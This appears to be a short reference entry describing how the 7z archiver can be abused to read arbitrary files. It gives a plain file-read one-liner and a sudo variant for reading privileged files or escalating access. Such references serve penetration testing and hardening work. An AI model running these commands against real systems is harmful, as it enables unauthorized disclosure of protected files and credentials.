# File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```bash
LFILE=file_to_read
7z a -ttar -an -so $LFILE | 7z e -ttar -si -so
```

# Sudo

If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```bash
LFILE=file_to_read
sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so
```
